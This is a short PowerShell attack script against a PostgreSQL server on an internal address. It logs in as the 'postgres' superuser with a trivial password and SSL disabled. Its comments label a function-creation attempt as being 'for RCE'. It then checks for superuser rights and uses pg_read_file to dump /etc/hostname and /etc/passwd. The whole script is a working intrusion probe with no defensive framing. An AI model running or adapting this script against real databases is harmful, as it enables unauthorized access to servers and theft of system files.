$c=New-Object System.Data.Odbc.OdbcConnection
$c.ConnectionString="Driver={PostgreSQL Unicode};Server=10.9.101.3;Port=5432;Database=postgres;Uid=postgres;Pwd=x;sslmode=disable"
try {
    $c.Open()
    Write-Host "CONNECTED"
    
    # Try creating a language function for RCE
    $cmd=$c.CreateCommand()
    $cmd.CommandText="CREATE OR REPLACE FUNCTION sys_exec(cmd text) RETURNS text AS 'BEGIN RAISE NOTICE ''exec: %'', cmd; RETURN cmd; END;' LANGUAGE plpgsql"
    $cmd.ExecuteNonQuery() | Out-Null
    Write-Host "FUNC_OK"
    
    # Check if we're actually superuser
    $cmd2=$c.CreateCommand()
    $cmd2.CommandText="SELECT current_user, current_setting('is_superuser')"
    $r=$cmd2.ExecuteReader()
    while($r.Read()){Write-Host ("USER:"+$r[0]+" SUPER:"+$r[1])}
    $r.Close()
    
    # Try to read files directly via pg_read_file (superuser function)
    $cmd3=$c.CreateCommand()
    $cmd3.CommandText="SELECT pg_read_file('/etc/hostname')"
    $r3=$cmd3.ExecuteReader()
    while($r3.Read()){Write-Host ("HOSTNAME:"+$r3[0])}
    $r3.Close()
    
    # Read /etc/passwd 
    $cmd4=$c.CreateCommand()
    $cmd4.CommandText="SELECT pg_read_file('/etc/passwd')"
    $r4=$cmd4.ExecuteReader()
    while($r4.Read()){Write-Host ("PASSWD:"+$r4[0])}
    $r4.Close()

} catch {
    Write-Host ("ERR:"+$_)
}
$c.Close()
